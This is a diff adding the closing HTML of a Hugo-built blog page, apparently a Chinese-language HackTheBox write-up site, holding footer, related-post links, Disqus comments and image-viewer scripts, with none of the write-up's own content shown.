+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Mar 29, 2025 13:37 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/htb/resolute/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/resolute/10.7509f1174a70fdf428fadcfd0b7df956_huc46b369003db4f264a29b97c941dd2d8_869949_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolute"
+                        
+                        data-hash="md5-dQnxF0pw/fQo&#43;tz9C335Vg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolute</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/sauna/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/sauna/3.1a3ba332db07695ffd237e0f12858e1c_hu0edf62eea5f63897e508bd0933d800cb_696703_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Sauna"
+                        
+                        data-hash="md5-GjujMtsHaV/9I34PEoWOHA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sauna</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/active/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/active/1.92b7a2ad9cdcb421afcb49cc205e6fa7_hud635dc65c578c3826fbc3164ed4ed890_1022125_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Active"
+                        
+                        data-hash="md5-kreirZzctCGvy0nMIF5vpw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Active</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/forest/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/forest/27.ae03b40a09d8f660b83467701cb220e8_hu902412dec8981223d15e2f092d55b9a4_883260_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Forest"
+                        
+                        data-hash="md5-rgO0CgnY9mC4NGdwHLIg6A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Forest</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/thenotebookdocker-%E9%80%83%E9%80%B8/">
+        
+        
+            <div class="article-image">
+                <img src="/htb/thenotebookdocker-%E9%80%83%E9%80%B8/21.ba4c9461ff16c9df0e7383977eed892c_hub1af5c15598150491dd14105b4c023c2_926511_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post TheNotebook(Docker 逃逸)"
+                        
+                        data-hash="md5-ukyUYf8Wyd8Oc4OXfu2JLA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TheNotebook(Docker 逃逸)</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+    body {
+  position: relative;  
+}
+
+body::before {
+  content: "";
+  position: fixed;  
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: url(https://nergigantes.github.io/background/1.png) no-repeat center top;
+  background-size: cover;
+  background-attachment: fixed;
+  z-index: -1;  
+}
+  </style>
+  
+    </body>
+</html>
